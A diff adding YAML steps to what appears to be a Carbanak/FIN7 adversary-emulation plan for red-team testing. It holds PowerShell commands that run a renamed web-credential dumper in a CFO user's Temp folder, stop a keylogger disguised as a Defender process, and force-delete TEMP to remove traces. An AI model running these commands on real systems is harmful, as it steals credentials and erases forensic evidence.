+  description: Upload and Execute Web Cred Dumper on CFO as CFO
+  tactic: collection
+  technique:
+    attack_id: T1555.003
+    name: "Credentials from Password Stores: Credentials from Web Browsers"
+  cti_source: "https://www.rsa.com/en-us/blog/2017-11/the-carbanak-fin7-syndicate"
+  procedure_group: procedure_collection
+  procedure_step: "9.B.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Move-Item dumpWebCreds.exe C:\Users\#{cfo.user.username}\AppData\Local\Temp\infosMin48.exe;
+          C:\Users\#{cfo.user.username}\AppData\Local\Temp\infosMin48.exe -i -H
+        payloads:
+        - dumpWebCreds.exe
+        cleanup: |
+          Remove-Item -Force C:\Users\#{cfo.user.username}\AppData\Local\Temp\infosMin48.exe
+
+  input_arguments:
+    cfo.user.username:
+      description: Username of CFO user
+      type: string
+      default: jsmith
+
+  executors:
+  - name: powershell
+    command: |
+      Move-Item dumpWebCreds.exe C:\Users\#{cfo.user.username}\AppData\Local\Temp\infosMin48.exe;
+      C:\Users\#{cfo.user.username}\AppData\Local\Temp\infosMin48.exe -i -H
+    cleanup_command: |
+      Remove-Item -Force C:\Users\#{cfo.user.username}\AppData\Local\Temp\infosMin48.exe
+
+- id: f3678315-cdbb-4579-b25d-f92783e5599b
+  name: Stop Keylogger and Clean Artifacts
+  description: Stop Keylogger and clean artifacts in TEMP directory
+  tactic: defense-evasion
+  technique:
+    attack_id: T1070.004
+    name: "Indicator Removal on Host: File Deletion"
+  cti_source: "https://www.fireeye.com/blog/threat-research/2019/04/carbanak-week-part-four-desktop-video-player.html"
+  procedure_group: procedure_def_evasion
+  procedure_step: "9.B.2"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Stop-Process -Name DefenderUpgradeExec;
+          Remove-Item $env:TEMP\* -Recurse -Force -Erroraction 'silentlycontinue'
+
+  executors:
+  - name: powershell
+    command: |
+      Stop-Process -Name DefenderUpgradeExec;
+      Remove-Item $env:TEMP\* -Recurse -Force -Erroraction 'silentlycontinue'
+
+# Step 10 - VNC Persistence
+
+  # Step 10.A - Install VNC Persistence - skipped, uses Metasploit's run_as module
+
+  # Step 10.B - Use VNC to transfer money - skipped, requires user interaction
